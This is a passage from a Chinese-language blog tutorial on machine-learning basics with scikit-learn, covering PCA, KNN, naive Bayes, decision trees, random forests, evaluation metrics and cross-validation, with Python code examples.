主成分分析进行数据降维    :return: None    """</span>    pca<span class="token operator">=</span>PCA<span class="token punctuation">(</span>n_components<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">)</span>    <span class="token comment">#实例化PCA,n_components=0.9代表保留百分之90的特征</span>    data<span class="token operator">=</span>pca<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">89</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">3.1</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当数据中有大量无效数据，比如如下场景：10000个顾客在超市中购买的物品，超市中的物品有1000种，因为每个顾客只会购买很少的物品，所以数据中会有大量的无效数据0存在，这时候就适合用主成分分析进行降维</p><h2 id="机器学习基础"><a href="#机器学习基础" class="headerlink" title="机器学习基础"></a>机器学习基础</h2><h3 id="机器学习常用算法"><a href="#机器学习常用算法" class="headerlink" title="机器学习常用算法"></a>机器学习常用算法</h3><p>数据类型很多时候是选择算法的依据，主要可分为两种，离散型数据，连续型数据</p><ul><li>离散型数据：又称统计型数据，所有的这些数据都是整数型，不可再分的，比如有多少人，多少车，不能再细化细分来提高准确度</li><li>连续型数据：变量可以在一定范围内任取一数，如长度，质量等，是有小数部分的</li></ul><p>机器学习开发流程：</p><p><img src="/images/image-20210219171016364.png"></p><p>机器学习算法分类如下：</p><p><img src="/images/image-20210219164329619.png"></p><p>大体上分为监督学习和非监督学习，也有半监督学习的机器学习算法。（这里只列举了部分常用算法）</p><h4 id="监督学习（预测）"><a href="#监督学习（预测）" class="headerlink" title="监督学习（预测）"></a>监督学习（预测）</h4><p>监督学习是目前最常见的机器学习类型。给定一组样本（通常由人工标注），它可以学会将 输入数据映射到已知目标［也叫标注（annotation）］。其目标是学习训练输入与训 练目标之间的关系</p><p>有特征值，有目标值</p><ul><li>k-近邻算法</li><li>贝叶斯分类</li><li>决策树与随机森林</li></ul><p>回归，对应连续型数值</p><ul><li>逻辑回归</li><li>岭回归</li><li>标注 隐马尔可夫模型</li></ul><h5 id="自监督学习"><a href="#自监督学习" class="headerlink" title="自监督学习"></a>自监督学习</h5><p>自监督学习是监督学习的一个特例，自监督学习是没有 人工标注的标签的监督学习，可以将它看作没有人类参与的监督学习。标签仍然存在（因为 总要有什么东西来监督学习过程），但它们是从输入数据中生成的，通常是使用启发式算法生 成的。</p><h4 id="无监督学习"><a href="#无监督学习" class="headerlink" title="无监督学习"></a>无监督学习</h4><p>只有特征值，无监督学习是指在没有目标的情况下寻找输入数据的有趣变换，其目的在于数据可视化、 数据压缩、数据去噪或更好地理解数据中的相关性。无监督学习是数据分析的必备技能，在解 决监督学习问题之前，为了更好地了解数据集，它通常是一个必要步骤。降维和聚类都是众所周知的无监督学习方法</p><p>聚类</p><ul><li>k-means</li></ul><h3 id="数据集的划分"><a href="#数据集的划分" class="headerlink" title="数据集的划分"></a>数据集的划分</h3><p>拿到数据后并不是将所有的数据用于模型的训练，所以数据会分为训练集和测试集，训练集用于训练模型，测试集用于评估模型，比例可以设为7:3,8:2,<strong>7.5:2.5</strong>,</p><p>用于划分数据集的API：sklearn.model_selection.train_test_split，在进行数据划分前首先要进行数据的获取，也是使用到了sklearn中的api</p><p><img src="/images/image-20210220113903532.png"></p><p><img src="/images/image-20210220120436843.png"></p><p><img src="/images/image-20210220120547900.png"></p><p><strong>x_train,x_test,y_train,y_test=train_test_split(x,y,test_size=0.25)</strong></p><p>返回四个值，分别为训练集特征值，测试集特征值，训练集的目标值，测试集的目标值，</p><p>参数x为特征值，y为目标值，test_size为测试集的比例，一般取0.25</p><h3 id="转换器与估计器"><a href="#转换器与估计器" class="headerlink" title="转换器与估计器"></a>转换器与估计器</h3><p><img src="/images/image-20210309221656731.png"></p><p>在调用fit()输入数据后就可以使用估计器中的方法来进行分类和回归</p><ul><li>fit传入x_train,y_train及传入训练集的数据，具体用法以knn为例</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">knn<span class="token operator">=</span> KNeighborsClassifier<span class="token punctuation">(</span>n_neighbors<span class="token operator">=</span><span class="token punctuation">)</span><span class="token comment">#实例化</span>   <span class="token comment">#传入训练集特征值和目标值</span>   knn<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span>y_train<span class="token punctuation">)</span>   y_predict<span class="token operator">=</span>knn<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span><span class="token comment">#预测，传入的测试集特征值进行预测，返回预测的特征值</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"预测的位置"</span><span class="token punctuation">,</span>y_predict<span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"预测准确率"</span><span class="token punctuation">,</span>knn<span class="token punctuation">.</span>score<span class="token punctuation">(</span>x_test<span class="token punctuation">,</span>y_test<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#进行预测，传入测试集的目标值和预测值进行比较，得到准确率</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="常用分类算法基础"><a href="#常用分类算法基础" class="headerlink" title="常用分类算法基础"></a>常用分类算法基础</h3><h4 id="KNN–k近邻算法"><a href="#KNN–k近邻算法" class="headerlink" title="KNN–k近邻算法"></a>KNN–k近邻算法</h4><p>选择最近的“邻居”作为分类依据</p><p><img src="/images/image-20210308161205001.png"></p><p>求“距离”就是本算法的核心</p><p><img src="/images/image-20210308161349924.png"></p><p>注意，在进行距离计算时需要先进行<strong>标准化处理</strong></p><p>API：sklearn.neighbors.KNeighborsClassifier(n_neighbors=5,algorithm=’auto’)</p><p><img src="/images/image-20210308161625253.png"></p><p>一个简单的完整knn开发流程如下：</p><p>导入数据–处理数据–数据分割–标准化–算法预测–后续调整</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>neighbors <span class="token keyword">import</span> KNeighborsClassifier  <span class="token comment">#knn算法api</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>model_selection <span class="token keyword">import</span> train_test_split    <span class="token comment">#数据分隔</span><span class="token keyword">import</span> sklearn<span class="token punctuation">.</span>decomposition    <span class="token comment">#主成分分析</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>preprocessing <span class="token keyword">import</span> StandardScaler    <span class="token comment">#标准化</span>pd<span class="token punctuation">.</span>set_option<span class="token punctuation">(</span><span class="token string">'display.max_columns'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment">#pandas展示所有列</span><span class="token keyword">def</span> <span class="token function">knn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    knn算法预测入驻位置    :return: None    """</span>    <span class="token comment">#读入数据</span>    <span class="token comment">#使用pandas读入csv文件</span>    data <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'./data/train.csv'</span><span class="token punctuation">)</span>    <span class="token comment">#进行测试，打印前10条</span>    <span class="token comment"># print(data.head(10))</span>    <span class="token comment">#处理数据</span>    <span class="token comment">#1.缩小数据量，使用pandas中的query</span>    data<span class="token operator">=</span>data<span class="token punctuation">.</span>query<span class="token punctuation">(</span><span class="token string">"x > 1.0 &amp; x &lt; 2.0 &amp; y > 1.0 &amp; y &lt; 2.0"</span><span class="token punctuation">)</span>    <span class="token comment">#2.对时间进行处理，使用pandas中的to_datetime实现,必须有返回值,返回时间格式的数据datetime</span>    time_value <span class="token operator">=</span> pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> unit<span class="token operator">=</span><span class="token string">'s'</span><span class="token punctuation">)</span>    <span class="token comment"># print(time_value)</span>    <span class="token comment"># 通过对处理过的时间戳数据进行处理，提取出新的特征，构造出新的特征</span>    <span class="token comment">#使用datetimeindex进行处理，将时间格式的数据转化为字典格式,可以直接获取年月日等数据</span>    time_value <span class="token operator">=</span> pd<span class="token punctuation">.</span>DatetimeIndex<span class="token punctuation">(</span>time_value<span class="token punctuation">)</span>    <span class="token comment"># 加入特征</span>    data<span class="token punctuation">[</span><span class="token string">'day'</span><span class="token punctuation">]</span><span class="token operator">=</span>time_value<span class="token punctuation">.</span>day    <span class="token comment"># data['year']=time_value.year</span>    data<span class="token punctuation">[</span><span class="token string">'month'</span><span class="token punctuation">]</span><span class="token operator">=</span>time_value<span class="token punctuation">.</span>month    data<span class="token punctuation">[</span><span class="token string">'hour'</span><span class="token punctuation">]</span><span class="token operator">=</span>time_value<span class="token punctuation">.</span>hour    data<span class="token punctuation">[</span><span class="token string">'weekday'</span><span class="token punctuation">]</span><span class="token operator">=</span>time_value<span class="token punctuation">.</span>weekday    <span class="token comment">#删除时间戳特征，使用drop,删除time,axis=1代表以列删除</span>    data<span class="token punctuation">.</span>drop<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment"># print(data)</span>    <span class="token comment">#进行筛选，将入住人数少的place_id去掉</span>    <span class="token comment">#返回一个以place_id进行groupby后的数据流,输出的place_count后的剩余列会被count的数值所取代，完成了计数的目的</span>    <span class="token comment">#所以这里只用place_id和后面的数量进行筛选就好了</span>    place_count<span class="token operator">=</span>data<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'place_id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#将少于3人入住的样本去掉，并重设索引，place_count是以place_id为索引</span>    <span class="token comment">#tf以通过reset_index()让其以之前的模式以row_id0,1,2,3。。。为索引</span>    tf<span class="token operator">=</span>place_count<span class="token punctuation">[</span>place_count<span class="token punctuation">.</span>row_id<span class="token operator">></span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>reset_index<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 对data进行筛选，以place_id为条件</span>    <span class="token comment">#使用了DateFrame中布尔索引，可以用满足布尔条件的列值来过滤数据</span>    data<span class="token operator">=</span>data<span class="token punctuation">[</span>data<span class="token punctuation">[</span><span class="token string">'place_id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isin<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>place_id<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token comment">#取出数据当中的特征值和目标值</span>    <span class="token comment">#设定特征值和目标值</span>    <span class="token comment">#特征值x</span>    x<span class="token operator">=</span>data<span class="token punctuation">.</span>drop<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'place_id'</span><span class="token punctuation">,</span><span class="token string">'row_id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">#目标值y</span>    y<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">'place_id'</span><span class="token punctuation">]</span>    <span class="token comment">#数据分割</span>    x_train<span class="token punctuation">,</span>x_test<span class="token punctuation">,</span>y_train<span class="token punctuation">,</span>y_test<span class="token operator">=</span>train_test_split<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>test_size<span class="token operator">=</span><span class="token number">0.25</span><span class="token punctuation">)</span>    <span class="token comment">#特征工程</span>    std<span class="token operator">=</span>StandardScaler<span class="token punctuation">(</span><span class="token punctuation">)</span>    x_train<span class="token operator">=</span>std<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>x_train<span class="token punctuation">)</span>    x_test<span class="token operator">=</span>std<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span>    <span class="token comment">#利用算法进行训练</span>    <span class="token comment">#实例化，与k=5</span>    knn<span class="token operator">=</span> KNeighborsClassifier<span class="token punctuation">(</span>n_neighbors<span class="token operator">=</span><span class="token punctuation">)</span>    <span class="token comment">#传入训练集特征值和目标值</span>    knn<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span>y_train<span class="token punctuation">)</span>    y_predict<span class="token operator">=</span>knn<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"预测的位置"</span><span class="token punctuation">,</span>y_predict<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"预测准确率"</span><span class="token punctuation">,</span>knn<span class="token punctuation">.</span>score<span class="token punctuation">(</span>x_test<span class="token punctuation">,</span>y_test<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    knn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在完成一次流程开发后需要做的就是提升精度，主要就是调参了，比如对k的值进行改变，对test_size进行改变</p><h4 id="朴素贝叶斯算法"><a href="#朴素贝叶斯算法" class="headerlink" title="朴素贝叶斯算法"></a>朴素贝叶斯算法</h4><p><strong>划分类别的基本思想：对其分类做概率预测，预测得到的概率最高的一项就是其分类的最终结果</strong></p><p>需要用到条件概率，而条件概率的使用条件是事件要相互独立，在B的条件下A的概率即P(A|B),B的条件下a1,a2的概率：P(a1,a2|B)=P(a1|B)*P(a2|B),</p><p><strong>所以朴素贝叶斯的使用场景是特征值相互独立</strong></p><p>朴素贝叶斯公式：</p><p><img src="/images/image-20210309231458564.png"></p><p>我们要求的就是在给出文档的特征的条件下，求出他是一类类别的概率，如上图所示</p><p><img src="/images/image-20210310211708613.png"></p><p>但有时候会出现概率为0的情况，比如一个词从未出现在一类文章中</p><p><img src="/images/image-20210310214336999.png"></p><p>云计算从来没出现在娱乐中过，此时一篇待预测文档出现了商场，影院，云计算这几个关键词，这时候求的P(云计算|娱乐)=0/121=0,那P(W|娱乐)直接为0了，但这样显然存在问题</p><p>解决方法：加入<strong>拉普拉斯平滑系数</strong></p><p>简单来说就是P(F1|C)=Ni/N变为Ni+a/N+a*m，即加上一个系数，a一般为1，m为特征词的个数，上图共有4个特征词，即商场，影院，支付宝，云计算。</p><p>API：sklearn.naive_bayes.MultinomialNB</p><p><img src="/images/image-20210310221413996.png"></p><p>朴素贝叶斯算法受训练及影响非常大</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>neighbors <span class="token keyword">import</span> KNeighborsClassifier  <span class="token comment">#knn算法api</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>model_selection <span class="token keyword">import</span> train_test_split    <span class="token comment">#数据分隔</span><span class="token keyword">import</span> sklearn<span class="token punctuation">.</span>decomposition    <span class="token comment">#主成分分析</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>preprocessing <span class="token keyword">import</span> StandardScaler    <span class="token comment">#标准化</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>datasets <span class="token keyword">import</span> fetch_20newsgroups<span class="token comment">#数据导入</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>naive_bayes <span class="token keyword">import</span> MultinomialNB   <span class="token comment">#朴素贝叶斯</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>feature_extraction<span class="token punctuation">.</span>text <span class="token keyword">import</span> TfidfVectorizer <span class="token comment">#特征抽取</span><span class="token keyword">def</span> <span class="token function">naivebayes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    朴素贝叶斯对新闻分类    :return:None    """</span>    <span class="token comment">#读入数据,来自sklearn.datasets API</span>    news <span class="token operator">=</span> fetch_20newsgroups<span class="token punctuation">(</span>subset<span class="token operator">=</span><span class="token string">'all'</span><span class="token punctuation">)</span>    <span class="token comment">#数据分割</span>    x_train<span class="token punctuation">,</span>x_test<span class="token punctuation">,</span>y_train<span class="token punctuation">,</span>y_test<span class="token operator">=</span>train_test_split<span class="token punctuation">(</span>news<span class="token punctuation">.</span>data<span class="token punctuation">,</span>news<span class="token punctuation">.</span>target<span class="token punctuation">,</span>test_size<span class="token operator">=</span><span class="token number">0.25</span><span class="token punctuation">)</span>    <span class="token comment">#特征抽取,tf-idf</span>    tf<span class="token operator">=</span>TfidfVectorizer<span class="token punctuation">(</span><span class="token punctuation">)</span>    x_train <span class="token operator">=</span> tf<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>x_train<span class="token punctuation">)</span>    x_test <span class="token operator">=</span> tf<span class="token punctuation">.</span>transform<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span>    <span class="token comment">#特征工程，预处理标准化，这里不能使用特征工程。。。。</span>    <span class="token comment"># st=StandardScaler()</span>    <span class="token comment"># x_train=st.fit_transform(x_train)</span>    <span class="token comment"># x_test=st.fit_transform(x_test)</span>    <span class="token comment">#进行转化</span>    nb<span class="token operator">=</span>MultinomialNB<span class="token punctuation">(</span>alpha<span class="token operator">=</span><span class="token number">1.0</span><span class="token punctuation">)</span>    nb<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span>y_train<span class="token punctuation">)</span>    y_predict <span class="token operator">=</span> nb<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"预测结果"</span><span class="token punctuation">,</span>y_predict<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确率"</span><span class="token punctuation">,</span>nb<span class="token punctuation">.</span>score<span class="token punctuation">(</span>x_test<span class="token punctuation">,</span>y_test<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是使用了sklearn中的20newsgroup进行朴素贝叶斯模型的一个对新闻分类的训练</p><ul><li><p>分类模型的评估：</p><p>包括了准确率，精确率，召回率</p></li></ul><ol><li>准确率：estimator.score()，各种估计器都有的方法，用其来判断模型的准确率</li></ol><p>混淆矩阵，在分类任务中，正确结果与标记之间存在四种不同的组合，构成了混淆矩阵，每一个分类都有自己的混淆矩阵</p><p><img src="/images/image-20210313153149507.png"></p><p><img src="/images/image-20210313153907682.png"></p><p>通过混淆矩阵，引出准确率和召回率</p><ol start="2"><li>精确率:  是正例的样本数为x,所有的样本数为z，对这z个样本进行预测后，有y个被预测为正例，<strong>这y个样本中共有k个在x中（k&lt;=x)**则精确率为：</strong>k/y**</li><li>召回率：是正例的样本数为x，对这x个样本进行进行预测后，有y个被预测为正例（y=&lt;x)则召回率为<strong>y/x</strong>，<strong>应用较多</strong></li><li>F1-score:反映了模型的稳健性<img src="/images/image-20210313155226962.png"></li></ol><p>使用api：sklearn.metrics.classfication_report</p><p><img src="/images/image-20210313155425551.png"></p><p>这里使用上面的朴素贝叶斯算法做一个演示：</p><p><code>print(&quot;对模型的评估：&quot;,classification_report(y_test,y_predict,target_names=news.target_nam es))</code></p><p><img src="/images/image-20210313161436217.png"></p><p>可以看到精确率，召回率，f1-score，support(划分为该类别的样本数量)</p><h4 id="决策树与随机森林"><a href="#决策树与随机森林" class="headerlink" title="决策树与随机森林"></a>决策树与随机森林</h4><p>决策树的初始起源很朴素，是一种<strong>if-then</strong>的判断过程</p><p>决策树的分类依据之一：信息增益，因为信息增益越大，表示得知该特征后分类不确定性减少越大</p><p>常见的使用决策树的算法：<br><img src="/images/image-20210315191708339.png"></p><p><strong>决策树使用API：sklearn.tree.DecisionTreeClassifier</strong></p><p><img src="/images/image-20210315191826561.png"></p><p><img src="/images/image-20210315201429343.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">dct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    决策树分析泰坦尼克号数据集    :return: None    """</span>    <span class="token comment">#读入数据</span>    data<span class="token operator">=</span>pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'./data/train.csv'</span><span class="token punctuation">)</span>    <span class="token comment">#选取特征值和目标值</span>    x_titan<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"Pclass"</span><span class="token punctuation">,</span><span class="token string">"Sex"</span><span class="token punctuation">,</span><span class="token string">"Age"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    y_titan<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">"Survived"</span><span class="token punctuation">]</span>    <span class="token comment"># print(x_titan)</span>    <span class="token comment">#缺失值处理</span>    x_titan<span class="token punctuation">[</span><span class="token string">"Age"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>fillna<span class="token punctuation">(</span>x_titan<span class="token punctuation">[</span><span class="token string">"Age"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>inplace<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token comment"># print(x_titan)</span>    <span class="token comment">#数据集分割</span>    x_train<span class="token punctuation">,</span>x_test<span class="token punctuation">,</span>y_train<span class="token punctuation">,</span>y_test<span class="token operator">=</span>train_test_split<span class="token punctuation">(</span>x_titan<span class="token punctuation">,</span>y_titan<span class="token punctuation">,</span>test_size<span class="token operator">=</span><span class="token number">0.25</span><span class="token punctuation">)</span>    <span class="token comment">#数据处理，（特征工程）one-hot</span>    <span class="token comment">#将x_train中的数据转换为字典格式以便进行one-hot编码</span>    dicts <span class="token operator">=</span> DictVectorizer<span class="token punctuation">(</span>sparse<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token comment">#实例化自带你类别处理器</span>    x_train<span class="token operator">=</span>dicts<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>x_train<span class="token punctuation">.</span>to_dict<span class="token punctuation">(</span>orient<span class="token operator">=</span><span class="token string">"records"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#pd方法转化为一个样本对应的一个字典</span>    x_test<span class="token operator">=</span>dicts<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>x_test<span class="token punctuation">.</span>to_dict<span class="token punctuation">(</span>orient<span class="token operator">=</span><span class="token string">"records"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>dicts<span class="token punctuation">.</span>get_feature_names<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x_train<span class="token punctuation">)</span>  <span class="token comment">#此时输出已经是one-hot转化后</span>    <span class="token comment">#决策树</span>    dec<span class="token operator">=</span>DecisionTreeClassifier<span class="token punctuation">(</span><span class="token punctuation">)</span>    dec<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span>y_train<span class="token punctuation">)</span>    <span class="token comment">#预测准确率</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"预测准确率"</span><span class="token punctuation">,</span>dec<span class="token punctuation">.</span>score<span class="token punctuation">(</span>x_test<span class="token punctuation">,</span>y_test<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>随机森林</strong>：包含多个决策树的分类器，属于集成学习方法</p><p><img src="/images/image-20210315202503426.png"></p><p>随机森林的建立过程：</p><p>数据集中有N个样本，M个特征</p><ol><li>建立单个树：<ol><li>随机在这N个样本中选取一个，重复随机选取N次<strong>重复随机代表被选取的样本中可能会有重复</strong></li><li>随机从M个特征中选取m个（m&lt;M)</li><li>按照这N个样本m个特征构成一个随机数</li></ol></li><li>循环上述过程，形成多个决策树</li></ol><p>这多个决策树的样本，特征大多不一样</p><p><img src="/images/image-20210315203309831.png"></p><p><strong>随机森林api：sklearn.ensemble.RandomForestVlassifier</strong></p><p><img src="/images/image-20210315204314832.png"></p><p><img src="/images/image-20210315205701421.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#和决策树公用一个数据集，可以进行对比</span>rf<span class="token operator">=</span>RandomForestClassifier<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#随机森林实例化，不传入参数，进行网格搜索</span>   param_grid<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"n_estimators"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"max_depth"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>   <span class="token comment"># 实例化</span>   msgv<span class="token operator">=</span>GridSearchCV<span class="token punctuation">(</span>rf<span class="token punctuation">,</span>param_grid<span class="token punctuation">,</span>cv<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>   msgv<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span>y_train<span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"随机森林预测准确率"</span><span class="token punctuation">,</span>msgv<span class="token punctuation">.</span>score<span class="token punctuation">(</span>x_test<span class="token punctuation">,</span>y_test<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="模型的选择与调优"><a href="#模型的选择与调优" class="headerlink" title="模型的选择与调优"></a>模型的选择与调优</h3><h4 id="交叉验证"><a href="#交叉验证" class="headerlink" title="交叉验证"></a>交叉验证</h4><p>交叉验证的目的是为了让被评估的模型更加准确可信，交叉验证用于评估模型的预测性能，尤其是训练好的模型在新数据上的表现，可以在一定程度上减小过拟合。</p><p>简单的说交叉验证就是将训练集划分为几个大小相同的集合，这里以四个为例，</p><p>我们将训练集随机分为4个等大小的集合，编号a,b,c,d（此时测试集不进行考虑）会进行四轮训练，</p><p>第一轮，以a,b,c为训练集，d为<strong>验证集</strong>，第二轮，a,b,d为训练集，c为<strong>验证集</strong>，以此类推，得到四轮训练模型。得到一个平均的结果，更加可信</p><p>运用到了基本的信息熵理论</p><p><img src="/images/image-20210315190344056.png"></p><p>信息熵和消除不确定性是相关的</p><p>信息增益：得知一个特征条件后，减少的信息熵的大小</p><p><img src="/images/image-20210315190657091.png"></p><p><strong>信息增益越大，作为判断依据越优先</strong>,<del>具体数学内容不做了解了，看不完了哈哈我靠</del></p><h4 id="网格搜索"><a href="#网格搜索" class="headerlink" 